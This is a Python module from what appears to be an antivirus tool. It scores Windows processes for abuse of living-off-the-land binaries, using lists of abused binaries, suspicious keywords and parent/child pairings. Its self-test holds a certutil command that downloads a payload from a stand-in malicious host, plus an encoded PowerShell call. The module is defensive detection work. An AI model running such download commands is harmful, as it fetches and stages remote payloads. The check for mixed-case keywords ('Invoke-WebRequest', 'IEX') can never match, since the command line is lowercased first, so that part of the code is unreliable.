"""Living-off-the-land (LOL) detection utilities.

This module encapsulates heuristics for identifying misuse of
legitimate system binaries and scripting engines.  The goal is to
provide a reusable detector that can be invoked by various components
(e.g. file_watch, browser_scanner) without duplicating logic.

The detection is intentionally lightweight and configurable; it can
operate in an "offline" fashion using command lines / process names.
A later extension could look at file hashes, digital signatures or
registry keys.

Example usage:

    from adaptiveav.lol_detector import LOLDetector

    score, reasons = LOLDetector.score_process(name, cmdline, parent_name)
    if score >= 4:
        # raise an alert

"""

from typing import List, Tuple

# known LOL binaries and scripting engines commonly abused by malware
_LOLBIN_NAMES = {
    "certutil", "regsvr32", "mshta", "rundll32", "installutil",
    "regasm", "regsvcs", "msbuild", "csc", "vbc", "wmic",
    # other frequently misused windows utilities
    "bitsadmin", "powershell", "cmd", "wscript", "cscript",
    "reg.exe", "schtasks", "tasklist", "taskkill",
}

# keywords or patterns that often accompany LOL abuse
_LOL_PATTERNS = ["http", "ftp", "\\\\", "base64", "download", "/c", "-enc"]

# parent-child spoofing patterns which increase confidence
_PARENT_DANGER_MAP = {
    "chrome",
    "firefox",
    "safari",
    "edge",
    "opera",
    "excel",
    "word",
    "outlook",
    "powerpoint",
    "onenote",
}

_DANGEROUS_CHILDREN = {"cmd", "powershell", "pwsh", "bash", "sh", "python", "wscript", "cscript", "mshta"}


class LOLDetector:
    @staticmethod
    def score_process(name: str, cmdline: str, parent_name: str = "") -> Tuple[int, List[str]]:
        """Evaluate a process for living-off-the-land indicators.

        Returns a tuple (suspicion_score, reasons).  Higher scores indicate
        greater likelihood of malicious usage of a legitimate binary.

        * `name` should be the lowercase executable name (without path).
        * `cmdline` is the full command line passed to the process.
        * `parent_name` is optional and may be used to detect spoofing.
        """
        name = name.lower()
        cmdline = cmdline.lower() if cmdline else ""
        parent_name = parent_name.lower() if parent_name else ""

        score = 0
        reasons: List[str] = []

        if name in _LOLBIN_NAMES:
            # baseline low confidence – bail out early if there are no extra
            # indicators, mirroring existing file_watch behaviour
            if any(pat in cmdline for pat in _LOL_PATTERNS):
                score += 4
                reasons.append(f"lolbas:{name}")
            else:
                reasons.append(f"lolbin:{name}")

        # scripting engines with suspicious flags
        if name in ("powershell", "pwsh") and any(flag in cmdline for flag in ("-enc", "-encodedcommand")):
            score += 4
            reasons.append("encoded-command")

        # consider typical keyword indicators
        for kw in ("download", "wget", "curl", "Invoke-WebRequest", "IEX"):
            if kw in cmdline:
                score += 3
                reasons.append(f"keyword:{kw}")

        # parent-child spoofing gives an extra boost
        if parent_name in _PARENT_DANGER_MAP and name in _DANGEROUS_CHILDREN:
            score += 5
            reasons.append(f"spawned-by-{parent_name}")

        return score, reasons


# convenience alias
detect = LOLDetector.score_process


if __name__ == "__main__":
    # simple self-test
    examples = [
        ("certutil", "-urlcache -f http://malicious.example/payload.exe payload.exe", ""),
        ("powershell", "-enc AWV4YW1wbGU=", "chrome"),
        ("notepad", "", "explorer"),
    ]
    for n, cmd, parent in examples:
        sc, rs = LOLDetector.score_process(n, cmd, parent)
        print(n, sc, rs)
